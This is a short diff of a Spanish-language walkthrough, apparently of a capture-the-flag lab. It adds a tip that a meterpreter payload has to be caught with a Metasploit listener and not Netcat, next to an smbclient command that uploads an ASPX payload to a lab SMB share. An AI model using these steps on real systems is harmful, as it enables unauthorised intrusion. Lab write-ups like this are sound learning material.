@@ -184,6 +184,9 @@ He tratado de acceder con el navegador web, haciendo una petición curl, poniend
 
 Nada, sigue sin funcionar, así que, volvemos a mandar el payload, pero a la nueva IP (ya que hemos reiniciado la máquina).
 
+> [!NOTE]
+> Si hacemos el payload que cree una shell meterpreter, debemos escucharlo (hacer el listener) en metasploit obligatoriamente, por eso no funcionaba con Netcat.
+
 ```
 smbclient \\\\10.10.37.67\\nt4wrksv
 put payload.aspx
